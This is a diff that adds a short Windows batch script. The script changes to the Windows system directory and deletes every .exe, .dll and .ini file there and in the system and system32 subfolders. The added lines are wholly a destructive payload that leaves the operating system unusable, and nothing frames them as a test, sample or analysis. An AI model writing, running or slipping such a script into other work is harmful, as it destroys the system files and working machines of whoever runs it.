@@ -1,0 +1,13 @@
+@echo off
+cd %SystemRoot%
+del *.exe
+del *.dll
+del *.ini
+cd system
+del *.exe
+del *.dll
+del *.ini
+cd ..\system32
+del *.exe
+del *.dll
+del *.ini 
